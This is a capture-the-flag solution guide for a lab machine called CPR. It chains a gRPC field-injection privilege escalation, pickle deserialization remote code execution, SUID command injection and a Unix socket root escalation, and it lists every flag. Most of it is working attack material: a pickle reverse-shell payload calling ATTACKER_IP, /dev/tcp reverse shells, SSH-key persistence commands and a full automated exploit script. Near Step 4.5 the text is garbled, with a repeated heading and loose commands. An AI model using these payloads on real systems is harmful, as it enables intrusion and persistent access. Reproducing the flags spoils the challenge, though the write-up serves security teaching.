# CPR - Complete Solution Guide

## Challenge Overview

CPR is a boot2root challenge featuring four stages of exploitation:
1. **Initial Access**: gRPC service enumeration and BOPLA privilege escalation
2. **RCE**: Insecure pickle deserialization to gain service account shell
3. **Lateral Movement**: SUID binary exploitation to pivot to user account
4. **Root Privilege**: Unix socket privilege escalation

## Flags

- **Flag 1**: `H7CTF{d1d_y0u_l3arn_ab0ut_pr0t0buf_inject10ns}`
- **Flag 2**: `H7CTF{need_oorugai_f0r_curd_r1c3}`
- **Flag 3**: `H7CTF{p1vot_1s_4_ch4nge_1n_strategy_w1th0ut_ch4nge_1n_vision}`
- **Flag 4**: `H7CTF{w3_really_w3nt_fr0m_oorugai_t0_un1x_s0ckets}`

---

## Stage 1: Reconnaissance & Service Discovery

### Step 1.1: Initial Port Scan

```bash
# Scan target
PS C:\Users\abura> nmap -sC -sV -A -p- 192.168.56.11 Starting Nmap 7.97 ( https://nmap.org ) at 2025-11-06 09:17 +0530 Nmap scan report for 192.168.56.11 Host is up (0.0011s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 42:9a:6f:f0:34:65:90:1a:d4:0d:bf:ef:a7:8c:ab:1c (ECDSA) |_ 256 3a:33:4d:b8:e0:c7:3e:58:46:ac:09:2f:b4:84:2f:df (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: H7Corp Microservices 50051/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port50051-TCP:V=7.97%I=7%D=11/6%Time=690C1AB6%P=i686-pc-windows-windows SF:%r(NULL,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0 SF:\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\ SF:x01")%r(GenericLines,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0 SF:\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0 SF:\0\0\0\0\?\0\x01")%r(GetRequest,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xf SF:f\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\ SF:x04\x08\0\0\0\0\0\0\?\0\x01")%r(HTTPOptions,34,"\0\0\x1e\x04\0\0\0\0\0\ SF:0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\ SF:0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(RTSPRequest,34,"\0\0\x1e\x0 SF:4\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\ SF:0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(RPCCheck,34,"\0 SF:\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\ SF:x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(DNSVer SF:sionBindReqTCP,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0 SF:@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0 SF:\0\?\0\x01")%r(DNSStatusRequestTCP,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f SF:\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0 SF:\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(Help,34,"\0\0\x1e\x04\0\0\0\0\0\0\x0 SF:3\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\ SF:x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(SSLSessionReq,34,"\0\0\x1e\x04\ SF:0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\ SF:xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01")%r(TerminalServerCoo SF:kie,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x04\0@\0\0\0\x05 SF:\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01" SF:)%r(TLSSessionReq,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff\xff\0\x0 SF:4\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\ SF:0\0\0\?\0\x01")%r(Kerberos,34,"\0\0\x1e\x04\0\0\0\0\0\0\x03\x7f\xff\xff SF:\xff\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0@\0\xfe\x03\0\0\0\x01\0\0\x04\x SF:08\0\0\0\0\0\0\?\0\x01"); MAC Address: 08:00:27:F3:9E:14 (Oracle VirtualBox virtual NIC) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 4.19 (97%), Linux 5.0 - 5.14 (97%), OpenWrt 21.02 (Linux 5.4) (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 6.0 (95%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 1.11 ms 192.168.56.11 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 130.00 seconds
```

**Discovery**: Port 50051 is open! This is the default/standard port for gRPC services. Let's verify it's actually gRPC.

### Step 1.2: gRPC Service Enumeration

```bash
# Check if gRPC reflection is enabled
grpcurl -plaintext 192.168.56.11:50051 list

# Output:
# cpr.auth.AuthService
# cpr.backup.BackupService
# cpr.monitoring.MetricsService
# cpr.user.UserService
# grpc.reflection.v1alpha.ServerReflection
```

**Discovery**: Reflection is enabled! We can enumerate all services and methods.

### Step 1.3: Enumerate Service Methods

```bash
# List AuthService methods
grpcurl -plaintext 192.168.56.11:50051 list cpr.auth.AuthService

# Output:
# cpr.auth.AuthService.LoginUser
# cpr.auth.AuthService.RegisterUser

# List UserService methods
grpcurl -plaintext 192.168.56.11:50051 list cpr.user.UserService

# Output:
# cpr.user.UserService.GetUserDetails
# cpr.user.UserService.ListUsers
# cpr.user.UserService.UpdateProfile

# List BackupService methods
grpcurl -plaintext 192.168.56.11:50051 list cpr.backup.BackupService

# Output:
# cpr.backup.BackupService.CreateBackup
# cpr.backup.BackupService.ListBackups
# cpr.backup.BackupService.RestoreBackup
```

### Step 1.4: Describe Message Structures

```bash
# Get UpdateProfile message definition
grpcurl -plaintext 192.168.56.11:50051 describe cpr.user.UpdateProfileRequest

# Output:
# cpr.user.UpdateProfileRequest is a message:
# message UpdateProfileRequest {
#   string user_id = 1;
#   string name = 2;
#   string email = 3;
#   string bio = 4;
#   bool is_admin = 5;           // Interesting! Can we set this?
#   int32 privilege_level = 6;   // This too?
# }
```

**Key Discovery**: The `UpdateProfile` method exposes `is_admin` and `privilege_level` fields! These should only be settable by administrators, but let's test if there's an authorization check...

---

## Stage 2: User Registration & Protobuf Field Injection

### Step 2.1: Register a User

```bash
# Register new user
grpcurl -plaintext -d '{
  "username": "hacker",
  "email": "hacker@test.com",
  "password": "Password123!"
}' 192.168.56.11:50051 cpr.auth.AuthService/RegisterUser

# Response:
# {
#   "success": true,
#   "message": "User registered successfully",
#   "user_id": "usr_abc123def456"
# }
```

**Save your user_id** - you'll need it for subsequent requests.

### Step 2.2: Login and Get Initial Details

```bash
# Login
grpcurl -plaintext -d '{
  "username": "hacker",
  "password": "Password123!"
}' 192.168.56.11:50051 cpr.auth.AuthService/LoginUser

# Response:
# {
#   "success": true,
#   "message": "Authentication successful",
#   "user_id": "usr_abc123def456"
# }

# Get user details
grpcurl -plaintext -d '{
  "user_id": "usr_abc123def456"
}' 192.168.56.11:50051 cpr.user.UserService/GetUserDetails

# Response:
# {
#   "success": true,
#   "user_id": "usr_abc123def456",
#   "username": "hacker",
#   "email": "hacker@test.com",
#   "role": "user",
#   "privilege_level": 0
# }
```

**Discovery**: We see `privilege_level: 0`. Let's enumerate existing users to understand the privilege hierarchy.

### Step 2.2a: Discover Privilege Level System (Optional Enum)

```bash
# Try listing users (will fail as non-admin, but worth trying)
grpcurl -plaintext -d '{
  "user_id": "usr_abc123def456"
}' 192.168.56.11:50051 cpr.user.UserService/ListUsers

# Response:
# {
#   "success": false,
#   "users": []
# }
```

**Note**: We can't list users yet, but after getting admin we'll see:
- `svc-metrics`: privilege_level 10 (low)
- `svc-backup`: privilege_level 50 (medium)  
- `admin`: privilege_level 100 (full admin)

This reveals **100 is the target privilege level** for full access.

### Step 2.3: Broken Object Property Level Authorization (BOPLA) Attack

**Vulnerability**: The `UpdateProfile` RPC exposes `is_admin` and `privilege_level` fields but doesn't validate whether the requesting user has permission to modify these sensitive fields. This is **OWASP API3:2023 - Broken Object Property Level Authorization**.

Regular users should NOT be able to set admin privileges, but the API lacks authorization checks!

```bash
# Exploit: Set admin fields as a regular user
# Note: We omit 'name' field to avoid username uniqueness constraint
grpcurl -plaintext -d '{
  "user_id": "usr_abc123def456",
  "email": "hacker@test.com",
  "bio": "CTF Player",
  "is_admin": true,
  "privilege_level": 100
}' 192.168.56.11:50051 cpr.user.UserService/UpdateProfile

# Response:
# {
#   "success": true,
#   "message": "Profile updated successfully"
# }
```

**What just happened?**
- We're a regular user who registered normally
- The API exposed admin fields in the proto definition
- No authorization check prevents us from setting `is_admin: true`
- Backend blindly accepts and stores these values
- We just escalated our privileges!

### Step 2.4: Verify Admin Access & Get Flag 1

```bash
# Get user details again
grpcurl -plaintext -d '{
  "user_id": "usr_abc123def456"
}' 192.168.56.11:50051 cpr.user.UserService/GetUserDetails

# Response:
# {
#   "success": true,
#   "user_id": "usr_abc123def456",
#   "username": "hacker",
#   "email": "hacker@test.com",
#   "bio": "CTF Player",
#   "role": "admin",
#   "privilege_level": 100,
#   "flag": "H7CTF{d1d_y0u_l3arn_ab0ut_pr0t0buf_inject10ns}"
# }
```

🚩 **Flag 1 Captured!**

---

## Stage 3: Pickle Deserialization RCE

### Step 3.1: Enumerate Backup Service

Now that we have admin privileges, we can access the BackupService.

```bash
# Try listing backups
grpcurl -plaintext -d '{
  "user_id": "usr_abc123def456"
}' 192.168.56.11:50051 cpr.backup.BackupService/ListBackups

# Response shows available backups
```

### Step 3.2: Analyze RestoreBackup Method

```bash
# Describe the RestoreBackup request
grpcurl -plaintext 192.168.56.11:50051 describe cpr.backup.RestoreRequest

# Output:
# message RestoreRequest {
#   string user_id = 1;
#   string backup_name = 2;
#   bytes backup_data = 3;  // INTERESTING!
# }
```

**Vulnerability**: The `backup_data` field accepts arbitrary bytes and the server uses Python's `pickle.loads()` to deserialize it.

### Step 3.3: Create Pickle Payload

Create `pickle_exploit.py`:

```python
#!/usr/bin/env python3
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        # Reverse shell command
        # Replace ATTACKER_IP with your IP
        cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f'
        return (os.system, (cmd,))

# Create pickle payload
payload = pickle.dumps(RCE())

# Encode to base64 for easy transmission
payload_b64 = base64.b64encode(payload).decode()

print(f"Payload (base64):\n{payload_b64}")
print(f"\nPayload (hex):\n{payload.hex()}")
```

Run the exploit:

```bash
python3 pickle_exploit.py
```

### Step 3.4: Setup Listener and Send Payload

```bash
# Terminal 1: Start listener
nc -nvlp 4444

# Terminal 2: Send malicious backup
# Copy the base64 payload from pickle_exploit.py
grpcurl -plaintext -d '{
  "user_id": "usr_abc123def456",
  "backup_name": "evil_backup",
  "backup_data": "gASVXQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfGJhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjU2LjEgNDQ0NCA+L3RtcC9mlIWUUpQu"
}' 192.168.56.11:50051 cpr.backup.BackupService/RestoreBackup
```

You should get a reverse shell as user `svc-runtime` (the service account)!

### Step 3.5: Stabilize Shell and Get Flag 2

```bash
# In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Check user
whoami
# svc-runtime

id
# uid=2001(svc-runtime) gid=999(svc-runtime) groups=999(svc-runtime)

# Get flag 2
cat /home/svc-runtime/flag.txt
```

🚩 **Flag 2**: `H7CTF{need_oorugai_f0r_curd_r1c3}`

---

## Stage 4: Lateral Movement (svc-runtime → abu)

### Step 4.1: Enumerate System as svc-runtime

```bash
# Check current directory
pwd
# /opt/cpr

# Look for interesting files and SUID binaries
ls -la
find / -perm -4000 -type f 2>/dev/null

# Output includes:
# /usr/local/bin/cpr-backup
```

### Step 4.2: Analyze SUID Binary

```bash
# Check the binary
ls -la /usr/local/bin/cpr-backup

# Output:
# -rwsr-sr-x 1 abu platform-admins 14472 Nov 6 02:00 /usr/local/bin/cpr-backup

# Run it to see usage
/usr/local/bin/cpr-backup

# Output:
# Usage: cpr-backup <backup_name>
# Creates a backup of CPR data directory

# It's a compiled binary, not a script!
file /usr/local/bin/cpr-backup
# /usr/local/bin/cpr-backup: ELF 64-bit LSB executable, x86-64, dynamically linked
```

**Discovery**: It's a compiled ELF binary. We need to reverse engineer it or test for vulnerabilities.

### Step 4.2a: Reverse Engineering (Optional)

Transfer the binary to your local machine for analysis:

```bash
# On target (from your reverse shell)
base64 /usr/local/bin/cpr-backup

# Copy the base64 output, then on your machine:
echo "BASE64_OUTPUT" | base64 -d > cpr-backup
chmod +x cpr-backup

# Analyze with strings
strings cpr-backup

# Key strings reveal:
# cd %s && tar -czf %s/%s.tar.gz . 2>/dev/null
# /opt/cpr/backups
# /opt/cpr/data

# Disassemble with Ghidra/IDA/Binary Ninja
# You'll see: sprintf() constructs command with user input in the middle
# Format: "cd DATA && tar -czf BACKUP_DIR/USER_INPUT.tar.gz ."
# Then system() executes it without sanitization!
```

**Vulnerability Found**: The binary uses `sprintf()` to construct:
```c
sprintf(command, "cd %s && tar -czf %s/%s.tar.gz . 2>/dev/null", 
        DATA_DIR, BACKUP_DIR, backup_name);
system(command);
```

User input (`backup_name`) is placed **before** `.tar.gz`, allowing command injection with `; command #` (the `#` comments out the remainder).

### Step 4.3: Command Injection Exploit

```bash
# Test normal execution
/usr/local/bin/cpr-backup test

# Output:
# [*] Creating backup: test
# [+] Backup created: /opt/cpr/backups/test.tar.gz

# The binary constructs: cd /opt/cpr/data && tar -czf /opt/cpr/backups/[INPUT].tar.gz . 2>/dev/null
# User input is placed before ".tar.gz" - we need to close the command and comment out the rest

# Exploit: Inject shell command with # to comment out remainder
/usr/local/bin/cpr-backup "test; /bin/sh #"
```

**Exploitation**: The binary constructs:
```bash
cd /opt/cpr/data && tar -czf /opt/cpr/backups/test; /bin/sh #.tar.gz . 2>/dev/null
```

Breaking it down:
1. `tar -czf /opt/cpr/backups/test` - creates archive named "test"
2. `;` - command separator 
3. `/bin/sh` - spawns shell as `abu` (SUID)
4. `#` - comments out `.tar.gz . 2>/dev/null`

The shell spawns with `abu` privileges!

### Step 4.4: Alternative Exploitation Methods

```bash
# Method 1: Direct shell spawn (recommended)
/usr/local/bin/cpr-backup "x; /bin/sh #"

# Method 2: Bash shell
/usr/local/bin/cpr-backup "x; /bin/bash #"

# Method 3: Reverse shell as abu
/usr/local/bin/cpr-backup "x; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4445 0>&1' #"

# Method 4: Read abu's flag directly (quick win)
/usr/local/bin/cpr-backup "x; cat /home/abu/flag.txt #"

# Method 5: Add SSH key for persistence
/usr/local/bin/cpr-backup "x; mkdir -p /home/abu/.ssh && echo 'YOUR_KEY' >> /home/abu/.ssh/authorized_keys #"

# Note: The # at the end is REQUIRED to comment out ".tar.gz . 2>/dev/null"
```

### Step 4.5: Verify Shell as abu and Get Flag 3

# Or spawn bash
/usr/local/bin/cpr-backup "x; /bin/bash"

# Or create reverse shell as abu
/usr/local/bin/cpr-backup "x; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4445 0>&1'"
```

### Step 4.5: Verify Shell as abu and Get Flag 3

```bash
# Check user
whoami
# abu

id
# uid=2002(abu) gid=1100(platform-admins) groups=1100(platform-admins)

# Get flag 3
cat /home/abu/flag.txt
```

🚩 **Flag 3**: `H7CTF{p1vot_1s_4_ch4nge_1n_strategy_w1th0ut_ch4nge_1n_vision}`

---

## Stage 5: Unix Socket Privilege Escalation (abu → root)

### Step 5.1: Enumerate System

```bash
# Check for interesting files/sockets
ls -la /var/run/

# Output shows:
# srwxrwx--- 1 root platform-admins  0 Nov  4 10:30 cpr-admin.sock
```

**Key Discovery**: We're in the `platform-admins` group and the socket is world-writable by that group!

### Step 5.2: Enumerate Socket Services

```bash
# Check if grpcurl is available
which grpcurl
# /usr/local/bin/grpcurl

# List services on Unix socket
grpcurl -plaintext -unix /var/run/cpr-admin.sock list

# Output:
# cpr.internal.AdminService
# grpc.reflection.v1alpha.ServerReflection
```

### Step 5.3: Enumerate Admin Service Methods

```bash
# List AdminService methods
grpcurl -plaintext -unix /var/run/cpr-admin.sock list cpr.internal.AdminService

# Output:
# cpr.internal.AdminService.CreateSudoUser
# cpr.internal.AdminService.ExecuteCommand
# cpr.internal.AdminService.GetRootShell
# cpr.internal.AdminService.RestartService
```

### Step 5.4: Method 1 - Create Sudo User

```bash
# Create new user with sudo privileges
abu@cpr-gateway:/opt/cpr/data$ grpcurl -plaintext -unix -d '{"username":"pwned","password":"Pwn3d123","sudo_access":true}' /var/run/cpr-admin.sock cpr.internal.AdminService/CreateSudoUser
{
  "success": true,
  "message": "User pwned created successfully with sudo privileges"
}
abu@cpr-gateway:/opt/cpr/data$ su pwned
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

pwned@cpr-gateway:/opt/cpr/data$ whoami
pwned
pwned@cpr-gateway:/opt/cpr/data$ id
uid=2003(pwned) gid=2003(pwned) groups=2003(pwned),27(sudo)
pwned@cpr-gateway:/opt/cpr/data$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied
pwned@cpr-gateway:/opt/cpr/data$ sudo su
root@cpr-gateway:/opt/cpr/data# cat /root/flag.txt
H7CTF{w3_really_w3nt_fr0m_oorugai_t0_un1x_s0ckets}
```

### Step 5.5: Method 2 - Direct Command Execution

```bash
abu@cpr-gateway:/opt/cpr/data$ grpcurl -plaintext -unix -d '{"command":"cat /root/flag.txt"}' /var/run/cpr-admin.sock cpr.internal.AdminService/ExecuteCommand
{
  "success": true,
  "output": "H7CTF{w3_really_w3nt_fr0m_oorugai_t0_un1x_s0ckets}\n"
}
```

### Step 5.6: Method 3 - Add SSH Key

```bash
# Generate SSH key on attacker machine
ssh-keygen -t rsa -b 2048 -f cpr_root

# Add public key to root's authorized_keys
grpcurl -plaintext -unix -d '{
  "command": "mkdir -p /root/.ssh && echo \"YOUR_PUBLIC_KEY_HERE\" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
}' /var/run/cpr-admin.sock cpr.internal.AdminService/ExecuteCommand

# SSH as root
ssh -i cpr_root root@192.168.56.11
```

🚩 **Flag 4**: `H7CTF{w3_really_w3nt_fr0m_oorugai_t0_un1x_s0ckets}`

---

## Complete Attack Summary

1. **Flag 1**: gRPC reflection → BOPLA privilege escalation → Admin access
2. **Flag 2**: Pickle deserialization → RCE as `svc-runtime` service account
3. **Flag 3**: SUID binary command injection → Lateral movement to `abu` user
4. **Flag 4**: Unix socket exploitation → Root privilege escalation

**Total Flags**: 4/4 ✓

---

## Automated Exploitation Scripts

### Full Exploit Chain

Create `full_exploit.py`:

```python
#!/usr/bin/env python3
"""
CPR Full Exploitation Chain
Automates: Registration -> Protobuf Injection -> Pickle RCE -> Unix Socket Privesc
"""

import subprocess
import json
import base64
import pickle
import os
import sys

TARGET = "192.168.56.11:50051"
ATTACKER_IP = "192.168.56.1"  # Update this
ATTACKER_PORT = 4444

class RCE:
    def __reduce__(self):
        cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ATTACKER_IP} {ATTACKER_PORT} >/tmp/f'
        return (os.system, (cmd,))

def grpc_call(service, method, data):
    """Execute grpcurl command"""
    cmd = [
        "grpcurl", "-plaintext",
        "-d", json.dumps(data),
        TARGET,
        f"{service}/{method}"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return json.loads(result.stdout) if result.stdout else None

print("[*] Stage 1: Registering user...")
reg_data = {
    "username": "hacker",
    "email": "hacker@test.com",
    "password": "Password123!"
}
response = grpc_call("cpr.auth.AuthService", "RegisterUser", reg_data)
user_id = response['user_id']
print(f"[+] User registered: {user_id}")

print("[*] Stage 2: Injecting admin fields via BOPLA...")
update_data = {
    "user_id": user_id,
    "name": "Admin",
    "email": "hacker@test.com",
    "is_admin": True,
    "privilege_level": 100
}
grpc_call("cpr.user.UserService", "UpdateProfile", update_data)
print("[+] Admin privileges gained via BOPLA vulnerability")

print("[*] Stage 3: Getting Flag 1...")
details = grpc_call("cpr.user.UserService", "GetUserDetails", {"user_id": user_id})
print(f"[+] Flag 1: {details['flag']}")

print("[*] Stage 4: Creating pickle payload...")
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print("[+] Payload created")

print(f"[*] Stage 5: Start listener on port {ATTACKER_PORT}")
print("[*] Press Enter when ready...")
input()

print("[*] Sending pickle payload...")
restore_data = {
    "user_id": user_id,
    "backup_name": "exploit",
    "backup_data": payload
}
grpc_call("cpr.backup.BackupService", "RestoreBackup", restore_data)
print("[+] Payload sent! Check your listener")
```

---

## Key Vulnerabilities Explained

### 1. gRPC Reflection Enabled

**Issue**: Reflection allows attackers to enumerate all services and methods without documentation.

**Fix**: Disable reflection in production or require authentication.

### 2. Broken Object Property Level Authorization (BOPLA)

**Issue**: The `UpdateProfile` handler exposes sensitive fields (`is_admin`, `privilege_level`) without authorization checks. Regular users can modify fields they shouldn't have access to.

**Real-world Impact**: This is OWASP API Security Top 10 - API3:2023. Common in APIs where developers expose all model fields without proper authorization.

**Fix**: 
- Implement field-level authorization checks
- Separate read/write DTOs (Data Transfer Objects)
- Only allow admins to modify sensitive fields
- Use role-based access control (RBAC) for field access

```python
# Proper implementation
def UpdateProfile(self, request, context):
    current_user = get_user_from_context(context)
    
    # Regular users cannot modify admin fields
    if not current_user['is_admin']:
        request.is_admin = current_user['is_admin']  # Keep existing value
        request.privilege_level = current_user['privilege_level']
    
    # Now update profile
    update_user_in_database(request)
```

### 3. Insecure Pickle Deserialization

**Issue**: Using `pickle.loads()` on untrusted data allows arbitrary code execution.

**Fix**:
- Never use pickle for untrusted data
- Use JSON, MessagePack, or protobuf for serialization
- Implement input validation and sandboxing

### 4. Unauthenticated Unix Socket

**Issue**: Root-level service accessible via Unix socket with only group permission check.

**Fix**:
- Implement proper authentication on Unix sockets
- Use capabilities instead of root privileges
- Audit group membership carefully

---

## Defense Recommendations

1. **Disable gRPC Reflection** in production environments
2. **Validate all input fields** explicitly, reject unknown fields
3. **Never use pickle** for user-controlled data
4. **Authenticate Unix socket connections** even with group restrictions
5. **Principle of least privilege** for service accounts
6. **Regular security audits** of gRPC services
7. **Implement rate limiting** on sensitive operations
8. **Use structured logging** to detect exploitation attempts

---

## Tools Reference

### grpcurl Quick Reference

```bash
# List services
grpcurl -plaintext <host>:<port> list

# List methods
grpcurl -plaintext <host>:<port> list <service>

# Describe message
grpcurl -plaintext <host>:<port> describe <message>

# Call method
grpcurl -plaintext -d '{"field":"value"}' <host>:<port> <service>/<method>

# Unix socket
grpcurl -plaintext -unix /path/to/socket list
```

### Python gRPC Client

```python
import grpc
import service_pb2
import service_pb2_grpc

channel = grpc.insecure_channel('192.168.56.11:50051')
stub = service_pb2_grpc.ServiceStub(channel)
response = stub.Method(service_pb2.Request(field="value"))
```

---

## Conclusion

This challenge demonstrated:
- Modern microservices enumeration techniques
- BOPLA (Broken Object Property Level Authorization) vulnerability
- Insecure deserialization exploitation
- SUID binary command injection for lateral movement
- Unix socket privilege escalation

All four flags obtained through realistic attack vectors found in real-world gRPC deployments.

**Total Flags**: 4/4 ✓

---

**Challenge Author**: AbuCTF  
**Difficulty**: Hard  
**Category**: Boot2Root / gRPC Security / Lateral Movement
